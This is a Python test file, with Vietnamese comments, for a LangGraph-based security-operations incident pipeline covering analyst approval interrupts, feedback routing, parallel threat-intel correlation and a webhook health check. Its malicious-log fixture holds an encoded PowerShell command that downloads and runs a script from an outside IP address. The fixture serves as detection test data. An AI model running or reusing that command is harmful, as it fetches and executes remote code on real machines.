# -*- coding: utf-8 -*-
"""
tests/test_langgraph_execution.py
Kiểm thử toàn diện cơ chế thực thi LangGraph chính thống, MemorySaver JsonPlusSerializer,
interrupt_before=['hitl_approval'], cold-thread hydration từ JSON, conditional_edges feedback loop,
Parallel Investigation 2 pha (CTI || det-RCA -> Correlation Join), Telemetry Scope, Ablation Flags,
Idempotent Ingestion và Webhook /api/v1/health.
"""

import json
import unittest
import warnings
from datetime import datetime, timezone
from unittest.mock import MagicMock

from starlette.testclient import TestClient

from src.api.webhook_server import DEFAULT_SECRET, WebhookService, create_app
from src.core.hitl_manager import DecisionType, HITLDecision, HITLManager
from src.core.orchestrator import (
    END,
    HAS_LANGGRAPH,
    StateGraphOrchestrator,
    create_full_soc_pipeline,
)
from src.core.schemas import (
    ActionType,
    IncidentStatus,
    LLMCallTelemetry,
    ParsedEvent,
    RawLogInput,
    RootCauseAnalysis,
    SeverityLevel,
    ThreatIntelEnrichment,
    TriageOutput,
)
from src.core.state import IncidentState


def _sample_malicious_raw() -> str:
    return json.dumps(
        {
            "EventID": 1,
            "ProcessId": "3104",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": (
                "powershell.exe -enc "
                "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAGEALgBwAHMAMQAnACkA"
            ),
            "ParentProcessId": "1024",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "Computer": "DC-SERVER-01",
            "User": "CORP\\admin",
            "DestinationIp": "194.26.29.112",
            "DestinationPort": 443,
            "Hashes": "SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        }
    )


def _sample_benign_raw() -> str:
    return json.dumps(
        {
            "EventID": 4624,
            "WorkstationName": "OFFICE-PC-02",
            "TargetUserName": "normal_employee",
            "TargetDomainName": "CORP",
            "LogonType": "2",
            "IpAddress": "127.0.0.1",
        }
    )


@unittest.skipUnless(HAS_LANGGRAPH, "langgraph package is required for LangGraph tests")
class TestLangGraphExecutionEngine(unittest.TestCase):
    """Kiểm thử thực thi CompiledStateGraph + MemorySaver an toàn."""

    def test_zero_unregistered_type_warnings_from_memory_saver(self):
        pipeline = create_full_soc_pipeline(auto_approve=True, use_langgraph_engine=True)
        state = IncidentState(
            incident_id="INC-LG-WARN-001",
            raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=_sample_malicious_raw())],
        )

        with warnings.catch_warnings(record=True) as caught:
            warnings.simplefilter("always")
            final_state = pipeline.invoke(state)

        unregistered = [
            str(w.message)
            for w in caught
            if "unregistered" in str(w.message).lower()
        ]
        self.assertEqual(unregistered, [], f"Unexpected MemorySaver warnings: {unregistered}")
        self.assertEqual(final_state.status, IncidentStatus.RESOLVED)
        self.assertEqual(final_state.execution_metrics.get("engine_mode"), "langgraph")
        self.assertEqual(final_state.workflow_telemetry.get("engine_mode"), "langgraph")
        self.assertIn("ingestion", final_state.execution_metrics.get("node_latencies_ms", {}))

    def test_fallback_loop_engine_mode_when_use_langgraph_false(self):
        orch = StateGraphOrchestrator(auto_approve=True, use_langgraph_engine=False)
        state = IncidentState(
            incident_id="INC-FB-MODE-001",
            raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=_sample_malicious_raw())],
        )

        final_state = orch.invoke(state)
        self.assertEqual(final_state.status, IncidentStatus.RESOLVED)
        self.assertEqual(final_state.execution_metrics.get("engine_mode"), "fallback_loop")

    def test_compile_cache_invalidation_and_no_duplicate_start_edges(self):
        orch = StateGraphOrchestrator(auto_approve=True)
        app1 = orch.get_langgraph_app()
        int_app1 = orch.get_langgraph_interrupt_app()
        self.assertIsNotNone(app1)
        self.assertIsNotNone(int_app1)

        # Changing entry point invalidates both caches and rebuilds without duplicate START edges
        def custom_start(state: IncidentState) -> IncidentState:
            state.workflow_telemetry["custom_start_ran"] = True
            return state

        orch.add_node("custom_start", custom_start)
        self.assertIsNone(orch._compiled_app)
        self.assertIsNone(orch._compiled_interrupt_app)

        orch.add_edge("custom_start", "ingestion")
        orch.set_entry_point("custom_start")
        app2 = orch.get_langgraph_app()
        self.assertIsNot(app1, app2)

        graph_repr = app2.get_graph()
        start_edges = [e for e in graph_repr.edges if e.source == "__start__"]
        self.assertEqual(len(start_edges), 1)
        self.assertEqual(start_edges[0].target, "custom_start")

        out = orch.invoke(
            IncidentState(
                incident_id="INC-LG-ENTRY-001",
                raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=_sample_malicious_raw())],
            )
        )
        self.assertTrue(out.workflow_telemetry.get("custom_start_ran"))
        self.assertEqual(out.status, IncidentStatus.RESOLVED)

    def test_interrupt_before_hitl_and_cold_thread_hydration_from_json(self):
        hitl_mgr = HITLManager()
        pipeline = create_full_soc_pipeline(
            hitl_manager=hitl_mgr,
            auto_approve=False,
            use_langgraph_engine=True,
        )
        initial_state = IncidentState(
            incident_id="INC-COLD-JSON-001",
            raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=_sample_malicious_raw())],
        )

        with warnings.catch_warnings(record=True) as caught:
            warnings.simplefilter("always")
            is_paused, paused_state = pipeline.execute_until_interrupt(initial_state)

        self.assertTrue(is_paused)
        self.assertEqual(paused_state.status, IncidentStatus.AWAITING_APPROVAL)
        self.assertEqual(paused_state.execution_metrics.get("engine_mode"), "langgraph")

        # Verify LangGraph interrupt_app paused right before hitl_approval
        tid = pipeline._active_threads.get("INC-COLD-JSON-001")
        self.assertIsNotNone(tid)
        snap = pipeline.get_langgraph_interrupt_app().get_state({"configurable": {"thread_id": tid}})
        self.assertEqual(snap.next, ("hitl_approval",))

        # Cold-thread hydration: serialize to JSON and resume on a brand-new pipeline instance!
        raw_json = paused_state.model_dump_json()
        restored_state = IncidentState.model_validate_json(raw_json)
        hitl_mgr.approve_all(restored_state, analyst_id="soc_lead_01", notes="Approved from JSON")

        cold_pipeline = create_full_soc_pipeline(
            hitl_manager=hitl_mgr,
            auto_approve=False,
            use_langgraph_engine=True,
        )
        with warnings.catch_warnings(record=True) as caught_resume:
            warnings.simplefilter("always")
            final_state = cold_pipeline.resume_from_interrupt(restored_state)

        unregistered = [
            str(w.message)
            for w in (caught + caught_resume)
            if "unregistered" in str(w.message).lower()
        ]
        self.assertEqual(unregistered, [])
        self.assertEqual(final_state.status, IncidentStatus.RESOLVED)
        self.assertIsNotNone(final_state.final_report)
        self.assertEqual(final_state.execution_metrics.get("engine_mode"), "langgraph")

    def test_resume_from_interrupt_routes_retry_response_and_retry_rca_via_conditional_edges(self):
        hitl_mgr = HITLManager()
        pipeline = create_full_soc_pipeline(
            hitl_manager=hitl_mgr,
            auto_approve=False,
            max_reanalysis=3,
            use_langgraph_engine=True,
        )
        initial_state = IncidentState(
            incident_id="INC-FEEDBACK-ROUTES-001",
            raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=_sample_malicious_raw())],
        )

        is_paused, paused_state = pipeline.execute_until_interrupt(initial_state)
        self.assertTrue(is_paused)
        self.assertEqual(paused_state.reanalysis_count, 0)

        # 1. Reject asking to adjust response plan (should route retry_response and pause again before hitl_approval)
        reject_response_state = paused_state.model_copy(deep=True)
        hitl_mgr.reject_all(
            reject_response_state,
            analyst_id="soc_lead_01",
            notes="Máy chủ Domain Controller trọng yếu, không cô lập host, điều chỉnh phương án",
        )
        after_retry_resp = pipeline.resume_from_interrupt(reject_response_state)
        self.assertEqual(after_retry_resp.status, IncidentStatus.AWAITING_APPROVAL)
        self.assertEqual(after_retry_resp.reanalysis_count, 1)
        self.assertIsNone(after_retry_resp.analyst_approved)
        self.assertIsNone(after_retry_resp.final_report)
        self.assertNotIn(
            ActionType.ISOLATE_HOST,
            [a.action_type for a in after_retry_resp.recommended_actions],
        )

        # 2. Reject asking to redo RCA (should route retry_rca -> rca -> response and pause again before hitl_approval)
        reject_rca_state = after_retry_resp.model_copy(deep=True)
        hitl_mgr.reject_all(
            reject_rca_state,
            analyst_id="soc_lead_01",
            notes="Sai RCA, yêu cầu tái điều tra nguyên nhân gốc rễ và tiến trình cha",
        )
        after_retry_rca = pipeline.resume_from_interrupt(reject_rca_state)
        self.assertEqual(after_retry_rca.status, IncidentStatus.AWAITING_APPROVAL)
        self.assertEqual(after_retry_rca.reanalysis_count, 2)
        self.assertIsNone(after_retry_rca.analyst_approved)

        # Verify both Feedback Loop transitions were recorded
        fb_routes = [
            t.metadata.get("target_route")
            for t in after_retry_rca.history
            if t.node == "hitl_approval" and t.metadata.get("target_route")
        ]
        self.assertEqual(fb_routes, ["retry_response", "retry_rca"])

        # 3. Finally approve -> proceed_reporting -> RESOLVED
        hitl_mgr.approve_all(after_retry_rca, analyst_id="soc_lead_01", notes="Phê duyệt hoàn tất")
        resolved_state = pipeline.resume_from_interrupt(after_retry_rca)
        self.assertEqual(resolved_state.status, IncidentStatus.RESOLVED)
        self.assertIsNotNone(resolved_state.final_report)

    def test_parallel_investigation_two_phase_correlation_and_self_correction_history(self):
        class StubRCAAgent:
            def __init__(self):
                self.analyze_calls = []
                self.correlate_calls = []

            def analyze_state(self, state: IncidentState, run_llm: bool = True) -> IncidentState:
                self.analyze_calls.append(run_llm)
                state.rca_result = RootCauseAnalysis(
                    initial_access_vector="Spearphishing Macro",
                    mitre_tactics=["Initial Access", "Execution"],
                    root_cause_summary="1. Overview\n5. Bối cảnh CTI & C2: Không ghi nhận máy chủ C2 ngoài mạng.",
                )
                state.record_transition(
                    node="rca",
                    to_status=IncidentStatus.INVESTIGATING,
                    message="Phase 1 deterministic RCA",
                )
                return state

            def correlate_with_threat_intel(self, state: IncidentState, run_llm: bool = True) -> IncidentState:
                self.correlate_calls.append(run_llm)
                # Verify CTI is already joined when Phase 2 runs
                assert state.threat_intel is not None
                state.rca_result.mitre_tactics.append("Command and Control")
                state.rca_result.root_cause_summary = "Updated with C2 194.26.29.112"
                state.record_transition(
                    node="rca_correlation",
                    to_status=IncidentStatus.INVESTIGATING,
                    message="Phase 2 correlated CTI and RCA",
                )
                return state

        rca_stub = StubRCAAgent()
        orch = StateGraphOrchestrator(
            rca_agent=rca_stub,
            enable_parallel_investigation=True,
            auto_approve=True,
        )

        # Start with LOW severity so fallback enrichment_node triggers Self-Correction escalation to CRITICAL
        state = IncidentState(
            incident_id="INC-PAR-2PHASE-001",
            parsed_events=[
                ParsedEvent(
                    event_id="EVT-PAR-1",
                    source_type="Sysmon",
                    timestamp=datetime.now(timezone.utc),
                    process_name="powershell.exe",
                    command_line="powershell.exe -enc AAAA",
                    dest_ip="194.26.29.112",
                )
            ],
            triage_result=TriageOutput(
                is_incident=True,
                confidence_score=0.65,
                severity=SeverityLevel.LOW,
                summary="Initial low severity",
            ),
        )

        out = orch.parallel_investigation_node(state)

        self.assertEqual(rca_stub.analyze_calls, [False])
        self.assertEqual(rca_stub.correlate_calls, [True])
        self.assertEqual(out.triage_result.severity, SeverityLevel.CRITICAL)
        self.assertIn("Updated with C2 194.26.29.112", out.rca_result.root_cause_summary)

        # Verify BOTH enrichment transitions (Self-Correction escalation + enrichment completion) are preserved
        enrichment_transitions = [t for t in out.history if t.node == "enrichment"]
        self.assertGreaterEqual(len(enrichment_transitions), 2)
        self.assertTrue(any(t.metadata.get("escalated") is True for t in enrichment_transitions))
        self.assertIn("enrichment", out.execution_metrics.get("node_latencies_ms", {}))
        self.assertIn("rca", out.execution_metrics.get("node_latencies_ms", {}))

    def test_parallel_investigation_mock_without_run_llm_and_reconcile_fallback(self):
        class LegacyMockRCAAgent:
            def analyze_state(self, state: IncidentState) -> IncidentState:
                state.rca_result = RootCauseAnalysis(
                    initial_access_vector="Macro",
                    mitre_tactics=["Execution"],
                    root_cause_summary="5. Bối cảnh CTI & C2: Không ghi nhận máy chủ C2 ngoài mạng.",
                )
                return state

        orch = StateGraphOrchestrator(
            rca_agent=LegacyMockRCAAgent(),
            enable_parallel_investigation=True,
        )
        state = IncidentState(
            incident_id="INC-PAR-FALLBACK-001",
            parsed_events=[
                ParsedEvent(
                    event_id="EVT-1",
                    source_type="Sysmon",
                    timestamp=datetime.now(timezone.utc),
                    process_name="powershell.exe",
                    dest_ip="194.26.29.112",
                )
            ],
            triage_result=TriageOutput(
                is_incident=True,
                confidence_score=0.8,
                severity=SeverityLevel.MEDIUM,
                summary="Suspicious script",
            ),
        )
        out = orch.parallel_investigation_node(state)
        self.assertIn("194.26.29.112", out.rca_result.root_cause_summary)
        self.assertIn("194.26.29.112", out.rca_result.attack_scope or "")

    def test_ablation_enable_rag_false_keeps_rag_kb_none_on_all_rag_agents(self):
        pipeline = create_full_soc_pipeline(enable_rag=False, llm_enabled=False)
        self.assertIsNone(pipeline.rag_kb)
        self.assertIsNone(pipeline.threat_intel_agent.rag_kb)
        self.assertFalse(pipeline.threat_intel_agent.enable_rag)
        self.assertIsNone(pipeline.rca_agent.rag_kb)
        self.assertFalse(pipeline.rca_agent.enable_rag)
        self.assertIsNone(pipeline.response_agent.rag_kb)
        self.assertFalse(pipeline.response_agent.enable_rag)
        self.assertIsNone(pipeline.reporting_agent.rag_kb)
        self.assertFalse(pipeline.triage_agent.llm_enabled)

        # Ensure ThreatIntelAgent does not lazy-init RAG when disabled
        self.assertIsNone(pipeline.threat_intel_agent._get_rag_kb())
        self.assertIsNone(pipeline.threat_intel_agent.rag_kb)

    def test_tiered_routing_fast_path_records_skipped_tiered_telemetry(self):
        pipeline = create_full_soc_pipeline(
            enable_tiered_routing=True,
            use_langgraph_engine=True,
        )
        state = IncidentState(
            incident_id="INC-TIERED-TEL-001",
            raw_logs=[RawLogInput(log_source="EVTX", raw_payload=_sample_benign_raw())],
        )
        out = pipeline.invoke(state)
        self.assertEqual(out.status, IncidentStatus.CLOSED_FALSE_POSITIVE)
        self.assertEqual(out.execution_metrics.get("engine_mode"), "langgraph")
        self.assertGreaterEqual(out.execution_metrics.get("tiered_saved_calls_count", 0), 1)
        self.assertTrue(
            any(t.provider_used == "skipped_tiered" for t in out.llm_telemetry)
        )

    def test_idempotent_ingestion_across_repeated_langgraph_runs(self):
        pipeline = create_full_soc_pipeline(auto_approve=True, use_langgraph_engine=True)
        state = IncidentState(
            incident_id="INC-LG-IDEM-001",
            raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=_sample_malicious_raw())],
        )
        s1 = pipeline.invoke(state)
        self.assertEqual(len(s1.parsed_events), 1)
        s2 = pipeline.invoke(s1)
        self.assertEqual(len(s2.parsed_events), 1)

    def test_webhook_health_endpoint_exposes_langgraph_agents_and_lightweight_llm_status(self):
        mock_provider = MagicMock()
        mock_provider.provider_mode = "omnirouter"
        mock_provider.model = "AICODE"
        mock_provider.last_health = None
        mock_provider._last_health_status = None
        mock_provider.get_active_provider.return_value = "none"

        svc = WebhookService(
            secret_token=DEFAULT_SECRET,
            allowed_ips=["*"],
            llm_provider=mock_provider,
            use_langgraph_engine=True,
        )
        app = create_app(svc)
        client = TestClient(app)

        # Default health check must be lightweight (must NOT call check_health)
        res = client.get("/api/v1/health")
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertEqual(data["status"], "healthy")
        self.assertEqual(data["service"], "wazuh-webhook-receiver")
        self.assertIn("min_rule_level", data)
        self.assertIn("timestamp", data)
        self.assertTrue(data["langgraph_enabled"])
        self.assertTrue(all(data["pipeline_agents"].values()))
        self.assertEqual(len(data["pipeline_agents"]), 6)
        self.assertFalse(data["llm_status"]["probed"])
        mock_provider.check_health.assert_not_called()

        # Active probe when probe_llm=true
        mock_provider.check_health.return_value = {
            "connected": True,
            "active_provider": "omnirouter",
            "configured_mode": "omnirouter",
            "model": "AICODE",
            "latency_ms": 11.2,
        }
        res_probe = client.get("/api/v1/health?probe_llm=true")
        self.assertEqual(res_probe.status_code, 200)
        self.assertTrue(res_probe.json()["llm_status"]["probed"])
        self.assertTrue(res_probe.json()["llm_status"]["connected"])
        mock_provider.check_health.assert_called_once()


if __name__ == "__main__":
    unittest.main()
